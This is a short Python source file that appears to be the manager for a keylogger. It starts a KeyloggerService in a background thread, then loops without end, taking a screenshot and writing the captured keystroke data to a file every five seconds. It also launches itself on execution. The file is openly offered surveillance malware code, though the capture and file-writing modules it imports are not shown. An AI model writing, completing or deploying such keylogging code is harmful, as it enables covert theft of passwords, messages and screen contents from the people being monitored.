from  KeyloggerService import *
from FileWriter import *
import threading
import time


class KeyLoggerManager:

    def __init__(self):
        self.instance = KeyloggerService()

    def start(self):
        self.instance.start()

    def write_to_file(self):
        FileWriter().write(self.instance.get_data())

    def main(self):
        threading.Thread(target=self.start).start()

        while True:
            print(self.instance.current_app == self.instance.prev_up)
            self.instance.current_screenshot()
            threading.Thread(target=self.write_to_file).start()
            time.sleep(5)

A = KeyLoggerManager()
A.main()
